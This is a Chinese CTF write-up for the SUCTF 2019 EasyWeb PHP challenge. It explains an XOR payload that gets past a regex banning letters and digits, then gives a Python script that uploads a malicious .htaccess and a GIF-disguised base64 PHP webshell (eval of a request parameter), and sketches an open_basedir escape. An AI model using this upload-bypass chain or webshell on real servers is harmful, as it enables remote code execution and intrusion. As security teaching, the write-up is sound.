---
title: '[SUCTF 2019]EasyWeb1特详解(无字符数字注入+木马图上床)'
abbrlink: 76efaa4d
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# [SUCTF 2019]EasyWeb1特详解(无字符数字注入+木马图上床)

## 前期知识点：

##### 1.php内置函数：`count_chars(string $string, int $mode)`

| **模式 ($mode)** | **它的逻辑（翻译成人话）**           | **返回值类型**      | **举例："banana"**                                       |
| ---------------- | ------------------------------------ | ------------------- | -------------------------------------------------------- |
| **0**            | 统计 0~255 所有 ASCII 码出现的次数。 | 数组 (Array)        | 一个超长数组，`[97]=>3, [98]=>1...` 其余没出现的都是 0。 |
| **1**            | 只统计出现次数大于 0 的字符。        | 数组 (Array)        | `[97]=>3, [98]=>1, [110]=>2` (a, b, n 的次数)            |
| **2**            | 看看哪些字符你**没用过**。           | 数组 (Array)        | 除了 a, b, n 以外所有字符的数组。                        |
| **3**            | 把用过的字符去重、排序、拼成字符串。 | **字符串 (String)** | **`"abn"`**                                              |
| **4**            | 把**没用过**的字符按顺序拼成字符串。 | **字符串 (String)** | `" !#...cdef..."` (除了 a, b, n 以外的所有字符)          |

##### 2.解析正则匹配：preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh)

外层：

>1.最外层：/.../ ->为正则地边界符，i表示忽略大小写
>
>2.末尾`+`表示量词：匹配[]里面的的字符，一次以上
>
>3.[]表示字符集，匹配方括号内任意字符

内层：

>1.“`x00- `”注意这里有一个空格
>
>匹配从 ASCII 码 `0`（不可见控制字符 `null`）到 **空格**（ASCII 32）之间的所有字符。
>
>包含一些像换行符 `\n`、回车符 `\r`、制表符 `\t` 等不可见字符。
>
>2.`0-9A-Za-z`：所有的数字和字母
>
>3.\'"\`~_&.,|=[	:这些字符也被过滤了
>
>4.\x7F	：匹配 ASCII 码 `127`，即 `DEL`（删除键）控制字符。



##### 3.在 PHP 中，访问数组元素或字符串位，**大括号 `{ }` 和中括号 `[ ]` 是通用的**。

## 题目：

```
 <?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>

```



## 过程思路：

1.代码审议

```
 <?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];//get传参

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');//payload有长度限制18
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )	//正则过滤数字字母和符号
    die('Try something else!');

$character_type = count_chars($hhh, 3);	//3表示功能3，从你的payload中先去重，再按顺序排列（详见前期知识点）
if(strlen($character_type)>12) die("Almost there!");	//你的payload中字符不能超过12种

eval($hhh);	//这里想到是system('ls /');
?>

```

看下来是无数字字母注入，但有对符号、字符种类、字符串长度的限制。

如果仅是普通的无数字字母注入，一般会用异或，取反，自增等方法->详见p神的[解析](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，真想成为像他一样的人的。

自增不行和system('ls /');不行，为什么？取反之后字符串长度太长了

取反为什么不行？正则把取反的符号`~`过滤了

最终我们选择异或。目标是phpinfo();

我们遇到一个问题,长度限制一个字符需要：至少两个字符再加上一个异或符号得到，如果是phpinfo长度就超了

例子：

```
符号1: ???????
符号2: OWOVQYP
PHP调用代码: ('???????'^'OWOVQYP')	//这里是俩俩对齐异或，然后拼接
//?异或O，?异或W,以此类推
```

什么情况下我们传入的东西符合长度，又能表示phpinfo？

常量看来是不可能的了，

不如直接传入变量，后面再加上这个变量值为phpinfo。

什么变量能够拿到我们传入的url后面的变量呢？全局变量get



2.构造payload

准备变量

```
${_GET}
```

准备数组下标（$_GET为关联数组）

```
目标： $_GET['a']
但由于[]被过滤，a字符不能出现，我们用不可见字符%ff
${_GET}{%ff}();&%ff=phpinfo
```

异或构造_get,用脚本

```
def generate_payload(target):
# 固定的异或因子
    key = 0xff
    part1 = ""
    part2 = ""

    for char in target:
# 计算：目标字符 ^ 0xff
        xor_result = ord(char) ^ key
# 构造 URL 编码
        part1 += "%ff"
        part2 += "%" + hex(xor_result)[2:].zfill(2)

    return part1, part2

target = "_GET"
p1, p2 = generate_payload(target)

print(f"--- 构造结果 ({target}) ---")
print(f"符号1: {p1}")
print(f"符号2: {p2}")
print(f"Payload 核心: (${{{p1}}}^{{{p2}}})")
```

拿到

```
--- 构造结果 (_GET) ---
符号1: %ff%ff%ff%ff
符号2: %a0%b8%ba%ab
Payload 核心: (${%ff%ff%ff%ff}^{%a0%b8%ba%ab})
```

3.payload：

```
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

传入得到

![](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260514213842042.png)

看到这里已经拿到flag了，但是有个问题，如果我们想要用图片上传的方式呢

```
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag
```

执行了函数，但是网页一片空白，想起源代码中有这么一行提示了我们可以用$_FILES，

```
if(!empty($_FILES["file"]))
```

用post上传 post的超全局变量 $_FILES

上传脚本

```
import requests
import base64

# --- 配置区 ---
target_url = "http://326a6e33-d6ea-4834-82b7-8cd5e2f657be.node5.buuoj.cn:81/"
# 这里的 Payload 是通过异或构造的，目的是执行 get_the_flag()
# 逻辑：$_GET['_'] = get_the_flag()
payload_url = target_url + "?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"

# --- 准备文件1：.htaccess ---
# 作用：改变服务器规则，让 .ahhh 文件变成 PHP 运行，并自动 Base64 解码包含内容
htaccess_content = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ahhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"
"""

# --- 准备文件2：shell.ahhh (Base64 木马) ---
# GIF89a12 用于伪装图片头和对齐字节
# 解码后是：<?php eval($_REQUEST['cmd']);?>
inner_shell = b"<?php eval($_REQUEST['cmd']);?>"
shell_content = b"GIF89a12" + base64.b64encode(inner_shell)


def upload_file(filename, content):
    print(f"[*] 正在尝试上传: {filename}...")
    files = {
        "file": (filename, content, "image/jpeg")  # 必须模拟图片类型
    }
    # 注意：我们必须在 URL 里带着异或 Payload，这样 eval 才会去执行 get_the_flag 函数
    response = requests.post(payload_url, files=files)

    if response.status_code == 200 and "upload" in response.text:
        print(f"[+] {filename} 上传成功！")
        print(f"[!] 服务器返回路径: {response.text.strip()}")
        return response.text.strip()
    else:
        print(f"[-] {filename} 上传失败，请检查 Payload 或网络。")
        return None


# --- 执行步骤 ---
# 第一步：传配置文件改规则
path_htaccess = upload_file(".htaccess", htaccess_content)

# 第二步：传木马
path_shell = upload_file("shell.ahhh", shell_content)

if path_shell:
    print("\n" + "=" * 30)
    print("【攻击准备就绪】")
    print(f"木马地址: {target_url}{path_shell}")
    print(f"利用示例: {target_url}{path_shell}?cmd=system('ls /');")
    print("=" * 30)

```



## 知识点总结：

#### 1.  .htaccess 配置文件攻击

- **AddType 指令**：可以将任意后缀（如 `.ahhh`, `.jpg`）映射为 PHP 脚本解析。
  - `AddType application/x-httpd-php .ahhh`
- **PHP 配置重写 (`php_value`)**：
  - `auto_append_file`：在页面结尾自动包含另一个文件。
  - **结合伪协议**：利用 `php://filter` 对包含的文件进行 Base64 解码。这是绕过 `<?` 过滤的手段。

#### 2.文件上传绕过技术

- **文件头伪装 (Magic Bytes)**：

  - `exif_imagetype()` 检查的是文件开头的字节。

  - **GIF**: `GIF89a`

  - **XBM**: `#define width 1337`（因为以 `#` 开头，不影响 `.htaccess` 的解析，非常巧妙）。

    此题:`GIF89a` 是字符串开头，它不是 Apache 配置文件认得的指令或注释。如果你在 `.htaccess` 开头写 `GIF89a`，Apache 会因为看不懂这行“乱码”指令而直接报 **500 Internal Server Error**，导致你的配置文件失效。

- **MIME 类型绕过**：在上传请求中手动修改 `Content-Type: image/jpeg`。

####  3.Base64 编码对齐

- **Base64 机制**：它将 3 个字节转为 4 个字符。
- **补位逻辑**：如果你在文件头加了 `GIF89a`（6 字节），为了让后面的 Base64 木马正常解码，必须补齐到 4 的倍数。
- **公式**：`[图片头] + [补位字符] + [Base64加密马]`。如果不对齐，解码后的二进制流会错位，导致 `<?php` 变成一堆乱码。

#### 4.open_basedir 绕过

在拿到 Shell 后，如果无法读取目录外的 `/flag`，通常是遇到了 `open_basedir` 限制。

- **核心逻辑**：通过 `chdir()` 切换目录并配合 `ini_set('open_basedir', '..')` 的漏洞，不断向上级目录跳转，最终达到“越狱”读取根目录的目的。

